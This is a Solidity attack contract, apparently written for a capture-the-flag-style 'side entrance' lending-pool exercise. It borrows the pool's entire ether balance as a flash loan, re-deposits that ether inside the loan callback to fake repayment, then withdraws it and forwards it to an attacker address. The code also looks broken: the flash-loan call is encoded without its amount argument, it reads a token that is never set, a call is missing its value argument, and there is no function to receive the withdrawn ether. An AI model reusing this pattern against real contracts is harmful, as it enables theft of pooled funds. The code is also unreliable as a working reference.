pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IPoolFunc {
    function flashLoan(
        uint256 amount) external;
    function deposit() external payable;
}

contract SideEntraceAttack {
    using Address for address;

    address public pool;
    IERC20 public token;
    address public attacker;
    uint256 public balance;

    constructor(address poolAddress,
                address attackerAddress
               ) 
    {
        attacker = attackerAddress;
        pool = address(poolAddress);
        balance = address(poolAddress).balance;
        console.log("Starting flashloan %s",balance);
        pool.functionCallWithValue(
            abi.encodeWithSignature(
                "flashLoan(uint256)"
            ),
            balance
        );
        
        console.log("Flashloan complete %s", token.balanceOf(address(this)));
        
    }

    function execute(uint256 amount) external {
         pool.functionCallWithValue(
            abi.encodeWithSignature(
                "deposit()"
            ),
            amount
        );
                //address(pool).deposit().sendValue(amount);
    }

    function printMoney() external {
        pool.functionCallWithValue(
            abi.encodeWithSignature(
                "withdraw()"
            )
        );
        address(attacker).send(balance);

    }

}